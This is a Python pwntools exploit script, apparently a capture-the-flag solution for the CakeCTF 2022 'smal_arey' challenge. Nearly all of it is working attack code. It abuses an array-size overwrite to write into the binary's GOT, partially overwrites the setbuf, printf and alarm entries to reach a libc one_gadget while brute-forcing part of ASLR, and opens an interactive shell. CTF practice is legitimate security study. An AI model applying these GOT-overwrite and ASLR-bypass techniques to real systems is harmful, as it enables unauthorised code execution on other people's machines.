from pwn import *
import ctypes


class Exploit():
    def __init__(self, chal_path, libc_path=None):
        self.chal = ELF(chal_path)
        self.libc = ELF(libc_path) if libc_path else None

        context.arch = self.chal.arch

        if args.REMOTE:
            self.p = remote("pwn1.2022.cakectf.com", 9002)
        else:
            env = {"LD_PRELOAD": libc_path} if libc_path else None
            self.p = process(self.chal.path, aslr=False, env=env)
            context.terminal = ["tmux", "splitw", "-h"]
            cmds = """
                b *setup
                c
            """
            gdb.attach(self.p, cmds)

    def run(self):
        '''
        for (name, offset) in self.chal.got.items():
            if name in ["__gmon_start__"]:
                continue
            print(name, hex(offset), hex(self.libc.symbols[name]))

        log.info("printf@libc like")
        for (name, offset) in self.libc.symbols.items():
            if offset>>(8*2) == self.libc.symbols["printf"]>>(8*2):
                print(name, hex(offset))
        '''
        print(hex(self.chal.got["setbuf"]))

        # Overwrite size
        self.p.sendlineafter(b"size: ", b"5")
        self.p.sendlineafter(b"index: ", b"4")
        self.p.sendlineafter(b"value: ", str(2 << 63-1).encode())

        # Overwrite arr to unaligned GOT so that we don't need libc leak
        #   ???         0x404010    ???
        #   setbuf      0x404018    0x8bad0
        #   printf      0x404020    0x61c90
        #   alarm       0x404028    0xe2d90
        #   one_gadget              0xe3afe
        self.p.sendlineafter(b"index: ", b"6")
        self.p.sendlineafter(b"value: ", str(
            self.chal.got["setbuf"] - 6).encode())

        # Overwrite setbuf@got[:2]
        new_setbuf = self.chal.symbols["setup"]
        val = (new_setbuf & 0xffff) << (8*6)
        print(hex(val))
        self.p.sendlineafter(b"index: ", b"0")
        self.p.sendlineafter(b"value: ", str(val).encode())

        # Overwrite printf@got[:2] + setbuf@got[2:]
        # Bruteforce ASLR by 0.5 byte and no need to care after this
        #new_printf = 0x0000000000401370  # self.chal.symbols["setup"] + 60
        new_printf = 0x00000000004013cf  # self.chal.symbols["setup"] + 60
        val = (new_printf & 0xffff) << (8*6) | (new_setbuf >> (8*2))
        print(hex(val))
        self.p.sendlineafter(b"index: ", b"1")
        self.p.sendlineafter(b"value: ", str(val).encode())

        time.sleep(0.5)
        log.info("Bypassed the 0.5-byte ASLR!")

        # Overwrite alarm@got[:2] + printf@got[2:]
        one_gadget_2lsb = 0x3afe
        one_gadget_2lsb = 0xfb04
        print(hex(one_gadget_2lsb))
        new_alarm_2lsb = one_gadget_2lsb
        val = (new_alarm_2lsb) << (8*6) | (new_printf >> (8*2))
        print(hex(val))
        # printf has been corrupted
        self.p.sendline(b"2")
        self.p.sendline(str(ctypes.c_int64(val).value).encode())

        # Overwrite printf@got[:2] + setbuf@got[2:]
        new_printf = self.chal.symbols["setup"]
        val = (new_printf & 0xffff) << (8*6) | (new_setbuf >> (8*2))
        print(hex(val))
        # printf has been corrupted
        self.p.sendline(b"1")
        self.p.sendline(str(val).encode())

        self.p.interactive()


def main():
    exploit = Exploit("./smal_arey/chall", "./smal_arey/libc.so.6")
    exploit.run()


if __name__ == "__main__":
    main()
